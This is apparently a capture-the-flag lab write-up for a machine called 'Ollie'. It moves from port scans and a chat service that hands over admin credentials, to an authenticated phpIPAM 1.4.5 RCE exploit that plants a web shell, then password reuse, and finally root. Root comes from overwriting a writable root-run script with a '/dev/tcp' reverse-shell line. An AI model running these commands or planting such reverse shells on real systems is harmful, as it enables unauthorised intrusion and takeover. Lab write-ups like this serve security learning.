# IP
10.10.23.9


## Enumeration

### Rustscan
- Found 3 ports running on the machine

```console
❯ rustscan -a 10.10.23.9 --ulimit 5000 | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.23.9:22
Open 10.10.23.9:80
Open 10.10.23.9:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 17:17 IST
Initiating Ping Scan at 17:17
Scanning 10.10.23.9 [2 ports]
Completed Ping Scan at 17:17, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:17
Completed Parallel DNS resolution of 1 host. at 17:17, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:17
Scanning 10.10.23.9 [3 ports]
Discovered open port 22/tcp on 10.10.23.9
Discovered open port 1337/tcp on 10.10.23.9
Discovered open port 80/tcp on 10.10.23.9
Completed Connect Scan at 17:17, 0.15s elapsed (3 total ports)
Nmap scan report for 10.10.23.9
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-11-18 17:17:04 IST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1337/tcp open  waste   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

### Nmap
- Started nmap scan for version detection and script on ports 22,80,1337.

```console
❯ nmap -sC -sV -p 22,80,1337 10.10.23.9 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 17:17 IST
Nmap scan report for 10.10.23.9
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Ollie :: login
|_Requested resource was http://10.10.23.9/index.php?page=login
| http-robots.txt: 2 disallowed entries
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP, GenericLines:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up,
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up,
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.92%I=7%D=11/18%Time=637770D2%P=x86_64-pc-linux-gnu%r(N
SF:ULL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,
SF:\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x2
SF:0")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x
SF:20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20yo
SF:ur\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\
SF:.\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20
SF:stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of
SF:\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\
SF:x20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What
SF:\x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger
SF:,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer
SF:\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Optio
SF:ns\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20
SF:are\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x2
SF:0I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20
SF:antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x
SF:20/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\
SF:x20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x2
SF:0Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers
SF:\.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey
SF:\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x
SF:20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20
SF:up,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\
SF:0\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x2
SF:0for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie
SF:,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\n
SF:What\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0
SF:\0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20he
SF:re\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20prote
SF:ctor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is
SF:\x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20
SF:while\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.31 seconds
```


- Seems like we can connect to port 1337 with netcat

### Netcat(:1337)

- Connected to netcat on port 1337

```console
❯ nc 10.10.23.9 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? Ollie
What's up, Ollie! It's been a while. What are you here for? flag
```
- Flag, we need Flag.
- It asks for breed of Ollie

```console
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf?
```
- He is bulldog we can see from the photo.

```console
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!
```

- We found credentials.
- Now we need to find place to use credentials

### Web(80)
- On port 80 found a login service running for `phpIPAM`
- Logged in with the credentials we found above.
- The service running, has version `1.4.5` .
- On searching for an exploit, found one 

```console
❯ searchsploit phpIPAM 1.4.5
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)                                                                                          | php/webapps/50963.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Exploitaion

### phpIPAM(1.4.5)

- Exploit the service

```console
❯ python3 50963.py -url http://10.10.23.9 -usr admin -pwd OllieUnixMontgomery!

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://10.10.23.9/evil.php. Parameter: cmd


[+] Output:
1	 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	3	4
```

- Got to the specified url and run command with cmd parameter.
- Create a shell file and upload it to the `/tmp` directory.
- Run it after giving enough permission.
- Got reverse shell and stabilized it.

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.23.9] 41316
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hackerdog:/var/www/html$ python3 -c "import pty; pty.spawn('/bin/bash')"
<ml$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@hackerdog:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1234

┌──(divu050704㉿kali)-[~]
└─$ stty raw -echo && fg
nc -lvnp 1234

www-data@hackerdog:/var/www/html$
www-data@hackerdog:/var/www/html$
www-data@hackerdog:/var/www/html$ export TERM=xterm
```

## Privilege Escalation(ollie)
- Reused the password we found earlier an got user access as ollie.

```console
www-data@hackerdog:/tmp$ su ollie
Password:
```


## Privilege Escalation (Root)
- Didn't find anything with linpeas.
- Loaded pspy64 to the machine and gave it a try.
- Found a shell file called feedme running as root

```console
2022/11/18 13:04:04 CMD: UID=0    PID=121335 | /bin/bash /usr/bin/feedme
```
- We have right access to it.

```console
ollie@hackerdog:/tmp$ ls -l /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```
- Uploaded a shell to it.

```console
ollie@hackerdog:/tmp$ cat /usr/bin/feedme
#! /bin/bash
sh -i >& /dev/tcp/10.17.0.215/4444 0>&1
```

- Got a reverse shell 

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.23.9] 44902
sh: 0: can't access tty; job control turned off
# whoami
root
```

